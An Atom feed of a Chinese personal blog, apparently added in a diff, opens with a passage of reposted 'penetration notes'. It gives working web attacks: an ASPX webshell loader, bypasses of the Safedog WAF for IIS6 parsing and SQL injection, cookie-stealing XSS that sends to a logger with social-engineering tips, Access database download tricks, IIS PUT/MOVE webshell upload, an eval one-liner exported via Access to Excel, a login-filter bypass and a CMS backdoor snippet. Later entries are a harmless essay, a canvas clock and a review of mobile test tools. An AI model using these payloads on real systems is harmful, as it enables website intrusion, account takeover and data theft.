+<h1 id="插件管理–修改器–最后一个选项双击–在右边的HTML-Body-haha-填写自己要展现的文字，点击开始即可欺骗成功！"><a href="#插件管理–修改器–最后一个选项双击–在右边的HTML-Body-haha-填写自己要展现的文字，点击开始即可欺骗成功！" class="headerlink" title="插件管理–修改器–最后一个选项双击–在右边的HTML Body = [haha!!] 填写自己要展现的文字，点击开始即可欺骗成功！"></a>插件管理–修改器–最后一个选项双击–在右边的HTML Body = [haha!!] 填写自己要展现的文字，点击开始即可欺骗成功！</h1><p>【 突破安全狗防注入及上传 】<br>写入webshell 写不进去，平常的一句话 也失效，用这段代码：<br>&lt;%@ Page Language=”C#” ValidateRequest=”false” %&gt; &lt;%try{System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[“admin163.net”].Value))).CreateInstance(“c”, true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null,null); } catch { }%&gt;<br>连接端用cncert的aspx一句话客户端<br>2、IIS6.0解析漏洞遇到安全狗<br>文件名为<a href="http://www.baicai.com/1.asp;1.jpg" target="_blank" rel="external">http://www.baicai.com/1.asp;1.jpg</a><br>这样的会被IIS安全狗果断屏蔽<br>改成如下名称,IIS6一样会解析:<br>www.baicai.com/;1.asp;1.jpg<br>3、安全狗的注入绕过<br>常用的如baicai.asp?id=1 and 1=1 是会被安全狗屏蔽的。<br>但这样就可以突破了：</p>
+<h1 id="baicai-asp-0day5-com-00-amp-id-69-20-and-1-1"><a href="#baicai-asp-0day5-com-00-amp-id-69-20-and-1-1" class="headerlink" title="baicai.asp?0day5.com=%00.&amp;id=69%20 and 1=1"></a>baicai.asp?0day5.com=%00.&amp;id=69%20 and 1=1</h1><p>【 跨站xss 】<br>在网站留言或者能输入信息的地方提交跨站代码，从而盗取管理员cookie，然后用cookie浏览器直接进入后台，将以下代码保存为asp文件，例如1.asp&lt;%<br>thisfile=Server.MapPath(“cookie.txt”)<br>msg=Request(“msg”)<br>set fs=server.CreateObject(“scripting.filesystemobject”)<br>set thisfile=fs.OpenTextFile(thisfile,8,True,0)<br>thisfile.WriteLine(“=======cookie:”&amp;msg&amp;”======by:剑眉大侠”)<br>thisfile.close<br>set fs=nothing<br>%&gt;<br>首先搭建一个asp环境，推荐使用“ASP服务器（摆脱安装IIS）” 再将1.asp放在wwwroot目录下，访问1.asp文件如果提示下载，则说明搭建成功了。<br>然后在留言板的“您的网站”一处输入：<script>doucument.location=’<a href="http://127.0.0.1/1.asp?msg=’document.cookie">http://127.0.0.1/1.asp?msg=’document.cookie</a></script><br>当管理员浏览我们提交的留言时，将在wwwroot目录下生成一个cookie.txt文件，这时我们只要访问cookie.txt这个文件，就能知道管理员的cookie是多少了！<br>然后再使用桂林老兵的cookie欺骗工具或是网页源代码查看分析器，访问网站再输入cookie进行欺骗登录即可！（填cookei的时候记得选择自定义）</p>
+<h1 id="小技巧：要想让管理员早点浏览你提交的留言，可以通过打电话，QQ客服等去社工他即可。"><a href="#小技巧：要想让管理员早点浏览你提交的留言，可以通过打电话，QQ客服等去社工他即可。" class="headerlink" title="小技巧：要想让管理员早点浏览你提交的留言，可以通过打电话，QQ客服等去社工他即可。"></a>小技巧：要想让管理员早点浏览你提交的留言，可以通过打电话，QQ客服等去社工他即可。</h1><p>【 爆库 】<br>%5C为十六进制的\符号，而数据库大于5.0就可以爆库，若一个网站数据库大于5.0，且是ACESS数据库，若不能注入的注入点是：<a href="http://www.xxx.com/rpc/show24.asp?id=127" target="_blank" rel="external">http://www.xxx.com/rpc/show24.asp?id=127</a><br>我们直接把%5C加到rpc后面，因为%5C是爆二级目录，所以应该是这样，<a href="http://www.xxx.com/rpc%5c/show24.asp?id=127" target="_blank" rel="external">http://www.xxx.com/rpc%5c/show24.asp?id=127</a><br>而%23是代表#，如果管理员为了防止他人非法下载数据库，而把数据库改成#database.mdb,这样防止了。<br>如果页面地址为：<a href="http://www.xx.com/rpd/#database.mdb" target="_blank" rel="external">http://www.xx.com/rpd/#database.mdb</a> ; 把%23替换#就可以下载了，即：<a href="http://www.xx.com/rpd/%23database.mdb" target="_blank" rel="external">http://www.xx.com/rpd/%23database.mdb</a><br>还有利用默认的数据库路径 <a href="http://www.xxx.com/" target="_blank" rel="external">http://www.xxx.com/</a> 后面加上 conn.asp 如果没有修改默认的数据库路径，也可以得到数据库的路径（注意：这里的/也要换成%5c）<br>如果你能看到：’E:/ahttc040901/otherweb/dz/database/iXuEr_Studio.asa’不是一个有效的路径。 确定路径名称拼写是否正确，以及是否连接到文件存放的服务器。</p>
+<h1 id="这样的就是数据库了。下载时用FLASHGET换成-MDB格式的就行"><a href="#这样的就是数据库了。下载时用FLASHGET换成-MDB格式的就行" class="headerlink" title="这样的就是数据库了。下载时用FLASHGET换成.MDB格式的就行."></a>这样的就是数据库了。下载时用FLASHGET换成.MDB格式的就行.</h1><p>【 利用sql注入点判断网站和数据库是否站库分离 】<br>在注入点后加上：and exists(select * from admin where 1=(Select (case when host_name()=@@servername then 1 else 0 end)))</p>
+<h1 id="注意admin一定要是存在的表段，如果返回正常，说明网站和数据库是在同一服务器，如果不正常则说明是站库分离的。"><a href="#注意admin一定要是存在的表段，如果返回正常，说明网站和数据库是在同一服务器，如果不正常则说明是站库分离的。" class="headerlink" title="注意admin一定要是存在的表段，如果返回正常，说明网站和数据库是在同一服务器，如果不正常则说明是站库分离的。"></a>注意admin一定要是存在的表段，如果返回正常，说明网站和数据库是在同一服务器，如果不正常则说明是站库分离的。</h1><p>【 iis6.0 PUT写入漏洞 】<br>利用工具：IIS PUT Scaner、桂林老兵IIS写权限利用程序<br>1、IIS来宾用户对网站文件夹有写入权限<br>2、web服务器扩展力设置webDAV为允许，即：WebDAV—打勾<br>3、网站主目录:写入—打勾(可PUT)<br>4、网站主目录:脚本资源访问—打勾（可COPY、MOVE）<br>大家都清楚，写权限就是允许PUT，与网站自身运行的权限无丝毫联系，如果开启了，就是没有一点安全意识，就给我们提供了大大的方便。<br>首先用御剑工具扫下C段，比如：12.12.12.1 – 12.12.12.255 打开IIS PUT Scaner，把12.12.12.1放在Start IP 这里，12.12.12.255放在End IP 这里，<br>接着在Port这里，换成80，点击Scan开始嗅探，当PUT这里显示是Yes就说明存在漏洞，可以右键选择PUT file，输入文件名1.txt，下面填内容，保存就可以写入了。<br>或是利用“桂林老兵IIS写权限利用程序”也可以，这款工具比较强大，把域名填写进去，例如：www.xxx.com，然后在请求文件那里输入你的文件名，<br>在数据包格式那里选择PUT，有的会直接弹出浏览文件框，没有就自己选择，在下面，然后点击提交数据库即可，一般是先PUT一个txt文件，再MOVE成asp木马。</p>
+<h1 id="直接提交asp木马的话，如果MOVE方法不行，可以试试Copy。"><a href="#直接提交asp木马的话，如果MOVE方法不行，可以试试Copy。" class="headerlink" title="直接提交asp木马的话，如果MOVE方法不行，可以试试Copy。"></a>直接提交asp木马的话，如果MOVE方法不行，可以试试Copy。</h1><p>【 ACCESS执行SQL语句导出一句话拿webshell 】<br>原理大致和php网站的outfile差不多，在access后台其他方法不能拿到webshell，但是后台有SQL语句查询执行，就可以直接access导出一句话拿webshell了。不过需要知道物理路径才能导出，利用IIS的解析漏洞导出EXCEL文件拿到webshell，因为ACCESS数据库不允许导出其他危险格式，我们导出为EXCEL后在利用IIS解析漏洞就可以变成我们的木马了。<br>点“服务器信息探测”，获得网站路径：e:\web\webshellcc\的EXCEL 点“系统管理”-》“自定义执行SQL”，试一下，能够执行的话可以用access导一句话拿下shell。<br>create table cmd (a varchar(50)) 建立一个有一个A字段的表 表名为cmd 字段类型为字符 长度为50<br>insert into cmd (a) values (‘&lt;%execute request(chr(35))%&gt;’) 在表cmd的a字段插入密码为#的一句话木马<br>select * into [a] in ‘e:\web\webshellcc\1.asa;x.xls’ ‘excel 4.0;’ from cmd 把cmd表a的内容导出到路径e:\web\webshellcc\的EXCEL文件<br>drop table cmd 删除建立的cmd表</p>
+<h1 id="菜刀连接：http-www-xxx-com-1-asa-x-xls"><a href="#菜刀连接：http-www-xxx-com-1-asa-x-xls" class="headerlink" title="菜刀连接：http://www.xxx.com/1.asa;x.xls"></a>菜刀连接：<a href="http://www.xxx.com/1.asa;x.xls" target="_blank" rel="external">http://www.xxx.com/1.asa;x.xls</a></h1><p>【 利用过滤’or’=’or’修改代码进行绕过 】<br>例如后台地址是：<a href="http://www.hdminc.net/admin/admin_index.asp" target="_blank" rel="external">http://www.hdminc.net/admin/admin_index.asp</a><br>当用万能密码登录的时候，会出现一些过滤or的提示！<br>请右键查看源文件，另存为桌面 XX.html，然后打开找到以下这段代码，进行删除！</p>
+<p><script language="”javascript”"><br>function chencklogin()<br>{<br>if(document.login.username.value==”)<br>{alert(‘请输入用户名’);<br>document.login.username.focus();<br>return false<br>}<br>if (document.login.password.value==”)<br>{alert(‘请输入密码’);<br>document.login.password.focus();<br>return false<br>}<br>}<br></script><br>注意：将以下段代码中的 “index.asp?action=chkadmin” 修改为 “<a href="http://www.hdminc.net/admin/admin_index.asp”" target="_blank" rel="external">http://www.hdminc.net/admin/admin_index.asp”</a></p>
+<p><form action="”index.asp?action=chkadmin”" name="”login”" method="”past”" onsubmit="return" checklogin();”=""></form></p>
+<h1 id="最后保存打开，再用’or’-’or’登录时，系统已不再过滤，结果就能用万能密码登录进去了！"><a href="#最后保存打开，再用’or’-’or’登录时，系统已不再过滤，结果就能用万能密码登录进去了！" class="headerlink" title="最后保存打开，再用’or’=’or’登录时，系统已不再过滤，结果就能用万能密码登录进去了！"></a>最后保存打开，再用’or’=’or’登录时，系统已不再过滤，结果就能用万能密码登录进去了！</h1><p>【 动力3.5拿shell 】<br>inurl:printpage.asp?ArticleID=<br>1.找到版权信息，把内容替换成：<br>版权所有 Copyright? 2003 <a href="’http://www.asp163.net’">动力空间</a>” ‘版权信息<br>if Request(“xiaoxin”)=”520″ then<br>dim allen,creat,text,thisline,path<br>if Request(“creat”)=”yes” then<br>Set fs = CreateObject(“Scripting.FileSystemObject”)<br>Set outfile=fs.CreateTextFile(server.mappath(Request(“path”)))<br>outfile.WriteLine Request(“text”)<br>Response.write “小新恭喜”<br>end if<br>Response.write “<form method="’POST’action='”&Request.ServerVariables(“URL”)&”?xiaoxin=520&creat=yes’">”
+Response.write “<textarea name="’text’">”&thisline&”</textarea><br>”
+Response.write “</form></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;渗透笔记&lt;br&gt;本文摘录了常用的网站渗透的内容，转自春秋社区。&lt;/p&gt;
+&lt;p&gt;【 常见网站程序 】&lt;br&gt;—————————————————————————————–&lt;br&gt;asp类：&lt;br&gt;foosun(风讯)&lt;br&gt;kesion(科汛)newasp(新云)&lt;br&gt;乔客CreateLive(创力)&lt;br&gt;5uCMSKingCMS&lt;br&gt;DvBBS(动网)&lt;br&gt;BBSxp[博客]zblog&lt;br&gt;[博客]pjblog&lt;br&gt;—————————————————————————————–&lt;br&gt;PHP类：&lt;br&gt;DeDeCms（织梦）&lt;br&gt;ECMS（帝国）&lt;br&gt;PHPCMS&lt;br&gt;PHP168&lt;br&gt;HBcms（宏博）SupeSite&lt;br&gt;CMSware(思维)Joomla!&lt;br&gt;[BBS]Discuz!&lt;br&gt;[BBS]phpWind[SNS]UCenterHome&lt;br&gt;[SNS]ThinkSNS[商城]EcShop&lt;br&gt;[商城]ShopEx[博客]WordPress&lt;br&gt;[维基]HDWiki&lt;br&gt;[微博]PHPsay[DIGG]PBdigg&lt;br&gt;—————————————————————————————–&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="渗透，sqlmap" scheme="http://www.craymc.com/tags/%E6%B8%97%E9%80%8F%EF%BC%8Csqlmap/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>等待你的分享：记一次没有结果的等待</title>
+    <link href="http://www.craymc.com/2015/11/23/%E7%AD%89%E5%BE%85%E4%BD%A0%E7%9A%84%E5%88%86%E4%BA%AB%EF%BC%9A%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B2%A1%E6%9C%89%E7%BB%93%E6%9E%9C%E7%9A%84%E7%AD%89%E5%BE%85/"/>
+    <id>http://www.craymc.com/2015/11/23/等待你的分享：记一次没有结果的等待/</id>
+    <published>2015-11-23T11:18:01.000Z</published>
+    <updated>2016-07-20T10:47:18.978Z</updated>
+    
+    <content type="html"><![CDATA[<p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="http://music.163.com/outchain/player?type=2&id=32507038&auto=false&height=66"></iframe></p>
+<p>  我认为所有没有结果的等待，大概是等的人都早已心知肚明。他们之所以还会固执的等下去，其实是在等着给自己一个交代。毕竟曾经需要一起努力的事情，并不想因为谁的中途退场而草率结束，所以我们常会选择一个人的坚守，坚守给自己看，并坚守给自己看。所以并没有真正的“无结果”，虚无就是结果。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;http://music.163.com/outchain/player?ty
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>在选择中成长</title>
+    <link href="http://www.craymc.com/2015/11/14/%E5%9C%A8%E9%80%89%E6%8B%A9%E4%B8%AD%E6%88%90%E9%95%BF/"/>
+    <id>http://www.craymc.com/2015/11/14/在选择中成长/</id>
+    <published>2015-11-14T05:46:24.000Z</published>
+    <updated>2016-07-20T10:47:18.976Z</updated>
+    
+    <content type="html"><![CDATA[<p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="http://music.163.com/outchain/player?type=2&id=307711&auto=false&height=66"></iframe><br>    人生路上我们会面临各种各样的选择，最可恶的我们无法避免这些选择，它们常常决定着我们未来的走向，所以我们会慎重，会迷茫，会焦虑。<br><a id="more"></a><br>    多年前，那时高二，在选择文理科的时候，我任性的选择了自己并不擅长的理科，就这样历经两次的高考洗礼后，来到了大学，来到了这个不明觉厉的“软件工程”。就这样开启了自己的geek探索生活，去论坛看看最新的技术，吐槽一下PHP，关心一下自己最爱的Java……一切对于编程的爱好 ，皆来源于装逼！<br>    不知不觉依然大三，对于我们来说这是大学生涯的最后一年看着大四孩子们去北京实训，心里痒，想跟着他们去，可能是厌倦了这里了罢。也许是迫不及待的想要去社会中磨练一番，然而此时，选择在此来临–是否考研？<br>    其实对于考研，一开始是拒绝的，因为早已厌倦了这种课堂生活，想要去实践中获得更多的东西，想要去社会生活中去证明自己，但是有时候又觉得心虚，能否胜任自己的想法，能否去证明自己，是不是还应该去更高的学府去锻造一番？对于考研，每个考研人的初衷各有不同，对于是否应该考研更是没有一个准确的定义与判断，当做出这个决定的时候，考研人便应该坚持自己的选择，无论如何也要坚持到底，无论成败，坚持下来依然成功。<br>    在我们这种尴尬的年纪看似成熟，却还是差那么一点，所以当我们在面临选择的时候，常常存在的一种心理是:“渴望别人同意的我们的观点，却又像得到一个不一样的建议，或者说想得到一个让自己心安理得的东西”！<br>    后来想到了一个道理，很多时候不是看见了结果才去选择或者坚持某种坚持和选择，既然立志于互联网，就应该无尽的去追寻她的脚步，无论考研与否，都应该坚持对编程的追求，保持对她的兴趣。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=330 height=86 src=&quot;http://music.163.com/outchain/player?type=2&amp;id=307711&amp;auto=false&amp;height=66&quot;&gt;&lt;/iframe&gt;&lt;br&gt;    人生路上我们会面临各种各样的选择，最可恶的我们无法避免这些选择，它们常常决定着我们未来的走向，所以我们会慎重，会迷茫，会焦虑。&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="生活" scheme="http://www.craymc.com/tags/%E7%94%9F%E6%B4%BB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>关于html</title>
+    <link href="http://www.craymc.com/2015/11/14/%E5%85%B3%E4%BA%8Ehtml/"/>
+    <id>http://www.craymc.com/2015/11/14/关于html/</id>
+    <published>2015-11-14T05:27:07.000Z</published>
+    <updated>2016-07-20T10:47:18.975Z</updated>
+    
+    <content type="html"><![CDATA[<p>本文是利用html5实现的一个简单动画（时钟），实现的关键在于html与js的配合使用，代码量不多，实现起来也比较容易，难点在于对角度的计算，需要注意的地方已经用注释标记。代码如下<br><a id="more"></a></p>
+<pre><code>&lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot; /&gt;
+    &lt;title&gt;&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;canvas id=&quot;canvas&quot; width=&quot;500&quot; height=&quot;500&quot;&gt;&lt;/canvas&gt;
+    &lt;script&gt;
+        var canvas = document.getElementById(&quot;canvas&quot;);
+        var context = canvas.getContext(&quot;2d&quot;);
+
+
+        function drawClock(){
+            context.clearRect(0,0,500,500);
+
+        var now = new Date();
+        var sec = now.getSeconds();
+        var min = now.getMinutes();
+        var hours = now.getHours();
+        //小时必须获取浮点类型 (小时+分钟/60)
+        hours = hours+min/60;
+        var hours = hours&gt;12?hours-12:hours;
+
+        context.lineWidth = 10;
+        context.strokeStyle = &quot;blue&quot;;
+        context.beginPath();
+        context.arc(250,250,200,0,360,false);
+        context.closePath();
+        context.stroke();
+
+        //画刻度
+        for(var i=0;i&lt;12;i++){
+            context.save();
+            context.lineWidth = 7;
+            context.strokeStyle = &quot;#000&quot;;
+            context.translate(250,250);//平移（移到中心位置）
+            //设置时钟偏移弧度
+            context.rotate(i*30*Math.PI/180);//弧度=math.PI/180[弧度=角度乘以π后再除以180
+                                                                                    //角度=弧度除以π再乘以180]
+                                                                                    //循环画出所有刻度
+            context.beginPath();//开启流
+            context.moveTo(0,-170);
+            context.lineTo(0,-190);//划线    
+            context.closePath();//关闭流
+            context.stroke();
+            context.restore();
+        }
+        //画分刻度
+        for(var i=0;i&lt;60;i++){
+            //保存当前状态
+            context.save();
+            context.beginPath();
+            context.lineWidth = 5;
+            context.strokeStyle = &quot;#000&quot;;
+            context.translate(250,250);
+            context.rotate(i*6*Math.PI/180);
+            context.moveTo(0,-180);
+            context.lineTo(0,-190);
+            context.closePath();
+
+            context.stroke();
+            context.restore();//恢复状态
+        }
+        //时钟
+        context.save();
+        context.lineWidth = 7;
+        context.strokeStyle = &quot;#000&quot;;
+        context.beginPath();
+        context.translate(250,250);
+        context.rotate(hours*30*Math.PI/180);
+        context.moveTo(0,-140);
+        context.lineTo(0,10);
+        context.closePath();
+        context.stroke();
+        context.restore();
+        //分钟
+        context.save();
+        context.lineWidth = 5;
+        context.strokeStyle = &quot;#000&quot;;
+        context.beginPath();
+        context.translate(250,250);
+        context.rotate(min*6*Math.PI/180);
+        context.moveTo(0,-140);
+        context.lineTo(0,10);
+        context.closePath();
+        context.stroke();
+        context.restore();
+        //秒钟
+        context.save();
+        context.lineWidth = 5;
+        context.strokeStyle = &quot;#ff0000&quot;;
+        context.beginPath();
+        context.translate(250,250);
+        context.rotate(sec*6*Math.PI/180);
+        context.moveTo(0,-160);
+        context.lineTo(0,15);
+        context.closePath();
+        context.stroke();
+        context.restore();
+        }
+
+
+        setInterval(drawClock,1000);//每隔1秒钟，上面的代码全部运行一次
+</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;本文是利用html5实现的一个简单动画（时钟），实现的关键在于html与js的配合使用，代码量不多，实现起来也比较容易，难点在于对角度的计算，需要注意的地方已经用注释标记。代码如下&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="html5" scheme="http://www.craymc.com/tags/html5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>3款iOS和Android最酷的开源自动化测试工具 </title>
+    <link href="http://www.craymc.com/2015/11/10/3%E6%AC%BEiOS%E5%92%8CAndroid%E6%9C%80%E9%85%B7%E7%9A%84%E5%BC%80%E6%BA%90%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"/>
+    <id>http://www.craymc.com/2015/11/10/3款iOS和Android最酷的开源自动化测试工具/</id>
+    <published>2015-11-10T04:48:20.000Z</published>
+    <updated>2016-07-20T10:47:18.970Z</updated>
+    
+    <content type="html"><![CDATA[<p>自动化测试在产品测试上有着非常重要的作用。实现测试自动化有多种积极的方式，包括最大限度地减少测试执行时间；在关键的发布阶段，用更少的时间确保更大的覆盖范围；在产品开发阶段，可靠又重复性地运行以确保没有引进回归问题。最大限度地减少重复性回归测试循环时的人为错误和疏忽的风险。<br><a id="more"></a><br>下面介绍5个最佳的iOS和Android开源自动化工具。 </p>
+<p>1.Calabash(适用于Android和iOS) </p>
+<p>Calabash 是一个开源的验收测试框架，支持Android和iOS自动化。Calabash为Android和iOS自动化测试提供了一个单独的库。这是一个跨平台的框架，支持 Cucumber，Cucumber能让你用自然的英语语言表述app的行为，实现BDD(Behavior Driven Development，行为驱动开发)。 </p>
+<p>Calabash提供了一个桥梁，允许Cucumber测试对iOS和Android运行和验证。Cucumber测试使用一列语句写入，这些语句会形成很多测试场景。Cucumber中的所有语句使用Ruby定义。在Calabash，Cucumber语句只能被定义一次，但可以在Cucumber脚本的不同场景中重复使用。实际测试是用Gherkin写的，依靠Ruby代码的支持，并在Cucumber框架的上下文中运行。 </p>
+<p>优点： </p>
+<p>◆大型社区支持。<br>◆简单，类似英语表述的测试语句。<br>◆支持在屏幕上的所有动作，如滑动，缩放，旋转，敲击等。<br>◆大型且热心的社区。<br>◆跨平台开发支持(同样的代码在Android和iOS设备中都适用)。 </p>
+<p>缺点： </p>
+<p>◆测试步骤失败后，将跳过所有的后续步骤。这可能会导致错过更严重的产品问题。<br>◆需要时间来进行测试，因为它首先总是默认安装app。但是，这种设置可以通过在代码中配置一个钩子(hook)覆盖掉。<br>◆需要Calabash框架安装在ios的ipa文件中。<br>◆我们必须要有iOS的app代码。<br>◆除了Ruby，对其他语言不友好。 </p>
+<p>2.Appium(Android和iOS) </p>
+<p>Appium是Sauce Labs出品的一个开源的自动化测试框架，用于原生、混合和移动的web app。框架内的Appium库函数调用Appium服务器是在操作连接设备的后台运行的。它在内部使用JSONWireProtocol，来与使用 Selenium的WebDriver的iOS和Android app进行互动。 </p>
+<p>不像Calabash只支持Ruby开发，在框架中使用Appium时，你可以从Java、Python和Ruby，以及所有其他Selenium WebDriver支持的语言中选择。Appium服务器被托管在Node服务器上。你可以通过触发一组Node命令来启动Appium服务器。使用Appium Standalone Application作为服务器(从Appium网站下载)，Inspector工具可对app的所有定位器提供查找/识别/操作的能力。 </p>
+<p>优点： </p>
+<p>◆支持多种语言。<br>◆不需要访问源代码。<br>◆跨平台脚本开发。<br>◆大型社区支持。<br>◆支持Mac上的脚本记录。<br>◆使用Appium Server应用程序的Inspector工具提取标识符。<br>◆通过Appium Server的桌面应用程序对Selendroid内置支持。<br>◆它还使用供应商提供的框架：适用于iOS的UIAutomation ，分别适用于Android 4.2+和 2.3+的UIAutomator和Selendroid。<br>◆支持物理设备与仿真器。<br>◆支持原生，混合和移动的web自动化应用程序。 </p>
+<p>缺点： </p>
+<p>◆Appium Server桌面应用程序的发布常常不稳定。<br>◆脚本记录不适用于Application服务器对于Windows OS的桌面应用程序。 </p>
+<p>3.Robotium(Android ) </p>
+<p>Robotium是一个开源的测试框架，用于开发功能性，系统，和验收测试场景。它与Selenium非常相似，除了Robotium只适用于Android。它注册在Apache License 2.0下。<br>因为它不但简单，而且又具有创建强大又可靠的自动化场景的能力，因而它在自动化测试社区广泛流行。<br>它采用运行时绑定到GUI组件。它安装了一个测试用例套件作为在Android设备或仿真器上的应用程序，并提供用于执行测试的真实环境。 </p>
+<p>优点： </p>
+<p>◆容易在最短的时间内编写测试脚本。<br>◆预装自动化app是可能的。<br>◆自动跟随当前activity。<br>◆由于运行时绑定到GUI组件，所以相比Appium，它的测试执行更快，更强大。<br>◆不访问代码或不知道app实现，也可以工作。<br>◆支持Activities、Dialogs、Toasts、Menus、Context Menus和其他Android SDK控件。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;自动化测试在产品测试上有着非常重要的作用。实现测试自动化有多种积极的方式，包括最大限度地减少测试执行时间；在关键的发布阶段，用更少的时间确保更大的覆盖范围；在产品开发阶段，可靠又重复性地运行以确保没有引进回归问题。最大限度地减少重复性回归测试循环时的人为错误和疏忽的风险。&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="Android" scheme="http://www.craymc.com/tags/Android/"/>
+    
+  </entry>
+  
+</feed>
